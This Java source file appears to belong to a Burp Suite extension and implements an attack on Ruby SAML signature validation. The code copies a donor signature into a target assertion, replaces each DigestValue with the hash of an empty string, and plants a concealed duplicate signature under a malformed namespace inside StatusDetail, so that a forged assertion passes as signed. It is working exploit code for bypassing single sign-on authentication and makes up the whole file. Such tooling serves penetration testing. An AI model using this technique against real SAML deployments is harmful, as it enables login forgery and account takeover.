package burp.wrappers;

import burp.utilities.helpers.XMLHelpers;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import java.io.IOException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;

import static burp.utilities.helpers.Constants.DS_NAMESPACE;
import static burp.utilities.helpers.Constants.XMLNS;

public class RubySAMLVoidWrapper {

    public RubySAMLVoidWrapper() {

    }

    public static String apply(Document document, Document src) throws IOException {
        XMLHelpers xmlHelpers = XMLHelpers.getInstance();

        // Step 0: clone
        Document newDoc = (Document) document.cloneNode(true);
        Document source = (Document) src.cloneNode(true);

        Element newResponse = (Element) newDoc.getElementsByTagNameNS("*", "Response").item(0);
        Element newAssertion = (Element) newDoc.getElementsByTagNameNS("*", "Assertion").item(0);

        // Step 1: Extract Response and Assertion
        if (newResponse == null) {
            throw new IllegalArgumentException("No <Response> element found.");
        }
        if (newAssertion == null) {
            throw new IllegalArgumentException("No <Assertion> element found.");
        }
        Element signature = null;

        Element sourceRoot = source.getDocumentElement();
        NodeList sourceSignatures = sourceRoot.getElementsByTagNameNS("*", "Signature");
        if (sourceSignatures.getLength() > 0) {
            signature = (Element) sourceSignatures.item(0);
        }

        if (signature == null) {
            throw new IllegalArgumentException("No signature found in donor document.");
        }

        xmlHelpers.removeAllSignatures(newDoc);
        Element sourceSignature = (Element) newDoc.importNode(signature, true);

        Element sigForAssertion = buildSignatureElement(newDoc, sourceSignature);

        NodeList digestValues = sigForAssertion.getElementsByTagNameNS("*", "DigestValue");
        for (int i = 0; i < digestValues.getLength(); i++) {
            digestValues.item(i).setTextContent(computeDigestFromSignature(sourceSignature));
        }

        Node firstChild = newAssertion.getFirstChild();
        while (firstChild != null && firstChild.getNodeType() != Node.ELEMENT_NODE) {
            firstChild = firstChild.getNextSibling();
        }

        if (firstChild == null || !"Issuer".equals(firstChild.getLocalName())) {
            throw new IllegalArgumentException("Expected <Issuer> as the first child of Assertion");
        }

        newAssertion.insertBefore(sigForAssertion, firstChild.getNextSibling());
        newAssertion.setAttributeNS(XMLNS, "xmlns:ns", "1");

        String namePrefix = sourceSignature.getPrefix();
        String signatureNamespace = sourceSignature.getNamespaceURI();
        // move namespace to the top
        if (namePrefix != null && !namePrefix.isEmpty() && signatureNamespace != null) {
            String xmlnsAttrName = "xmlns:" + namePrefix;

            if (!newResponse.hasAttributeNS(XMLNS, namePrefix)) {
                newResponse.setAttributeNS(
                        XMLNS,
                        xmlnsAttrName,
                        signatureNamespace
                );
            }
        }

        // We can use samlp:Extensions or samlp:Status/samlp:StatusDetail Nodes
        Element status = (Element) newResponse.getElementsByTagNameNS("*", "Status").item(0);
        if (status != null) {
            String statusPrefix = status.getPrefix();
            String statusNamespace = status.getNamespaceURI();

            String qualifiedName = (statusPrefix != null && !statusPrefix.isEmpty())
                    ? statusPrefix + ":StatusDetail"
                    : "StatusDetail";

            Element statusDetail = newDoc.createElementNS(statusNamespace, qualifiedName);

            Element conceal = newDoc.createElement("Conceal");
            Element reveal = newDoc.createElement("Reveal");
            conceal.setAttribute("xmlns", DS_NAMESPACE);
            reveal.setAttribute("xml:xmlns", "http://www.w3.org/2000/09/xmldsig_#");
            conceal.appendChild(reveal);
            Element newSig = newDoc.createElement("Signature");
            NodeList children = sourceSignature.getChildNodes();

            for (int i = 0; i < children.getLength(); i++) {
                Node imported = newDoc.importNode(children.item(i), true);
                newSig.appendChild(imported);
            }
            reveal.appendChild(newSig);

            status.appendChild(statusDetail);

            statusDetail.appendChild(conceal);
        } else {
            throw new IllegalArgumentException("Document doesn't have extensibility objects.");
        }

        String originalAssertionID = sourceRoot.getAttribute("ID");
        newAssertion.setAttribute("ID", originalAssertionID);

        return xmlHelpers.getString(newDoc, 0, true);
    }

    private static Element buildSignatureElement(Document doc, Element sourceSignature) {
        String prefix = sourceSignature.getPrefix();
        String ns = sourceSignature.getNamespaceURI();
        String qualifiedName = (prefix != null && !prefix.isEmpty()) ? prefix + ":Signature" : "Signature";

        Element newSig = doc.createElementNS(ns, qualifiedName);
        if (qualifiedName.equals("Signature")) {
            newSig.setAttributeNS(
                    XMLNS,
                    "xmlns",
                    DS_NAMESPACE
            );
        }
        NodeList children = sourceSignature.getChildNodes();
        for (int i = 0; i < children.getLength(); i++) {
            Node imported = doc.importNode(children.item(i), true);
            newSig.appendChild(imported);
        }
        return newSig;
    }


    private static String computeDigestFromSignature(Element signatureElement) {
        NodeList digestMethodNodes = signatureElement.getElementsByTagNameNS("*", "DigestMethod");
        if (digestMethodNodes.getLength() == 0) {
            throw new IllegalArgumentException("No <DigestMethod> found in Signature element.");
        }

        Element digestMethod = (Element) digestMethodNodes.item(0);
        String algorithmUri = digestMethod.getAttribute("Algorithm");

        String javaAlgorithm = XMLHelpers.mapXmlDigestAlgorithm(algorithmUri);
        if (javaAlgorithm == null) {
            throw new IllegalArgumentException("Unsupported digest algorithm: " + algorithmUri);
        }

        try {
            MessageDigest digest = MessageDigest.getInstance(javaAlgorithm);
            byte[] hashBytes = digest.digest("".getBytes(java.nio.charset.StandardCharsets.UTF_8));
            return Base64.getEncoder().encodeToString(hashBytes);
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException("Hash algorithm not available: " + javaAlgorithm, e);
        }
    }
}
